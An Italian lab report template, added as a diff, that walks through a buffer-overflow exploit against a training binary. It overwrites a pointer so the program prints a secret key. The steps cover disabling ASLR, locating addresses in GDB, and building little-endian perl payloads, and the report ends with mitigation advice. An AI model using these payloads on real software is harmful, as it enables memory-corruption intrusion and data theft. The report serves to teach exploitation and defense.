@@ -1,0 +1,108 @@
+REPORT BINARY EXPLOITATION — WRITE VAR (sovrascrittura puntatore/variabile)
+
+Obiettivo: il valore segreto (es. una private key) è un DATO presente in memoria.
+Il programma, nel suo flusso normale, lo stampa tramite una funzione di scrittura
+che legge da un puntatore/variabile. Sfruttando un buffer overflow si sovrascrive
+quel puntatore (l'"input" della funzione di scrittura) con l'indirizzo del dato
+segreto, così da farne stampare il valore. NON si devia il flusso di esecuzione:
+si altera solo un dato.
+
+
+1. DISATTIVAZIONE ASLR
+Disabilito la randomizzazione degli indirizzi per rendere stabili gli indirizzi
+dei dati durante l'analisi.
+
+  $ sudo sysctl -w kernel.randomize_va_space=0
+  $ cat /proc/sys/kernel/randomize_va_space
+  0
+
+
+2. INQUADRAMENTO DELL'ESERCIZIO
+Dall'analisi del binario (sorgente o disassemblato) risulta che la flag/chiave non
+è prodotta da una funzione nascosta da richiamare, ma è un dato già presente in
+memoria che una funzione di stampa emette dereferenziando un puntatore
+sovrascrivibile. Si tratta quindi di una sovrascrittura di variabile/puntatore,
+non di una secret function.
+
+
+3. INDIVIDUAZIONE DELL'INDIRIZZO DEL DATO SEGRETO
+In GDB localizzo l'indirizzo del dato da far stampare (la private key). Prima di
+leggere l'indirizzo avvio l'esecuzione e mi fermo su main, così il binario è
+caricato con gli indirizzi definitivi. Questo passo è indispensabile per i binari
+PIE (indirizzi tipo 0x5655...): senza aver avviato il programma otterrei un offset,
+non l'indirizzo reale a runtime. Per i non-PIE (indirizzi fissi tipo 0x0804...) è
+innocuo. Quindi lo faccio sempre.
+
+  $ gdb ./write_var1
+  (gdb) break main
+  (gdb) run
+  (gdb) info variables                 # elenco variabili globali/statiche
+  (gdb) print &[NOME_VARIABILE]        # indirizzo della variabile segreta
+  (gdb) x/s [INDIRIZZO]                # conferma: visualizzo il contenuto
+
+Indirizzo del dato segreto: [KEY_ADDR, es. 0x0804a028]
+
+
+4. INDIVIDUAZIONE DELL'OFFSET FINO AL PUNTATORE BERSAGLIO
+Devo capire dopo quanti byte di padding il mio input raggiunge e sovrascrive il
+puntatore usato dalla funzione di scrittura. Inietto [OFFSET] byte 'A' seguiti da
+4 byte 'B' (0x42424242) come marcatore, metto un breakpoint prima della chiamata
+alla funzione di stampa e verifico quando il puntatore assume il valore marcatore.
+
+  (gdb) break [prima della funzione di stampa]
+  (gdb) run $(perl -e "print 'A'x[OFFSET] . 'BBBB'")
+  (gdb) print [NOME_PUNTATORE]         # oppure:  x/4xb &[NOME_PUNTATORE]
+
+Quando il puntatore vale esattamente 0x42424242, l'offset è corretto. Altrimenti
+aggiusto il numero di 'A' di ±1/±2.
+(Se la cella bersaglio coincide con l'indirizzo di ritorno, l'offset è quello
+stampato da offset_finder.sh come offset EIP.)
+
+Offset fino al puntatore: [OFFSET] byte.
+[INSERIRE SCREENSHOT DEL PUNTATORE = 0x42424242]
+
+
+5. CONVERSIONE LITTLE-ENDIAN E COSTRUZIONE DEL PAYLOAD
+Scrivo l'indirizzo del dato segreto in Little-Endian (byte invertiti).
+
+  Indirizzo del dato:         0x0804a028
+  Scomposizione in byte:      08 04 a0 28
+  Inversione Little-Endian:   \x28\xa0\x04\x08
+
+Payload finale:  "A" x [OFFSET]  +  "\x28\xa0\x04\x08"
+(Il puntatore della funzione di scrittura viene così fatto puntare al dato segreto.)
+
+
+6. ESECUZIONE DELL'EXPLOIT E LETTURA DEL VALORE
+  $ ./write_var1 $(perl -e "print 'A'x[OFFSET] . '\x28\xa0\x04\x08'")
+
+NOTA SUI BYTE NULLI — Se l'indirizzo del dato contiene un byte 0x00, la forma con
+$(...) tronca il payload al primo byte nullo. In quel caso uso una forma in cui il
+payload non passa dalla shell:
+
+  $ perl -e 'exec "./write_var1", "A"x[OFFSET] . "\x28\xa0\x04\x08"'
+  # oppure via standard input:
+  $ (perl -e 'print "A"x[OFFSET] . "\x28\xa0\x04\x08"'; cat) | ./write_var1
+
+La funzione di scrittura, leggendo dal puntatore sovrascritto, stampa il contenuto
+all'indirizzo del dato segreto.
+
+Output ottenuto (private key / flag):
+  [INSERIRE IL VALORE STAMPATO]
+[INSERIRE SCREENSHOT DEL TERMINALE]
+
+
+7. VARIANTE "IF DA SUPERARE"
+Se invece l'esercizio chiede di far assumere a una variabile di controllo un
+VALORE preciso per superare un controllo (es. if(var == 0x42434445)), il
+procedimento è identico ma i 4 byte iniettati sono quel valore, non un indirizzo:
+
+  Payload:  "A" x [OFFSET]  +  Little-Endian del valore richiesto (\x45\x44\x43\x42)
+
+
+8. MITIGAZIONE
+La vulnerabilità nasce da una copia senza controllo di lunghezza (strcpy/gets) che
+consente di scrivere oltre il buffer fino a raggiungere un puntatore/variabile
+adiacente. Si corregge con funzioni a limite esplicito (strncpy/snprintf/fgets),
+validando l'input e non memorizzando segreti in chiaro in memoria accanto a buffer
+scrivibili. Vanno inoltre riabilitate stack canary, NX e ASLR.
